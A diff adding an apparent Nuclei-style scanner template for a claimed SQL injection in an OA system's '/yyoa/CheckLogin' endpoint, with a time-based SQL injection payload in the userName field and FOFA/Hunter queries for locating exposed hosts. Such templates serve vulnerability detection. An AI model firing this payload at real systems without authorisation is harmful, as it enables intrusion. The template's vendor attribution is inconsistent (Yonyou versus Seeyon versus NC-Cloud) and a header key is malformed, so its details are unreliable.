@@ -1,0 +1,39 @@
+id: 用友OA CheckLogin 存在SQL注入漏洞
+time: '2023-07-20'
+
+
+info:
+  name: 用友OA CheckLogin 存在SQL注入漏洞
+  severity: high
+  description: 北京致远互联软件股份有限公司 OA系统 CheckLogin 存在SQL注入漏洞，攻击者可利用该漏洞获取系统敏感信息等
+  reference: https://mp.weixin.qq.com/s/AdbzqcXkZ4GoQUI3J6Qeyw
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: FOFA:app="用友-NC-Cloud"
+    Hunter: web.body="uap/rbac"
+  
+http:
+  - method: 
+      - POST
+    path:
+      - "{{BaseURL}}/yyoa/CheckLogin" 
+    
+    Rheader:
+      - Content-Type:application/x-www-form-urlencoded,
+    body: 
+      - |
+        userName=11' AND (SELECT 6355 FROM (SELECT(SLEEP(0)))sHcE) AND 'wert'='wert&loginit12=&password=
+        
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "登录名错误，查无此人"
+
+      - type: status
+        status:
+          - 200
+    
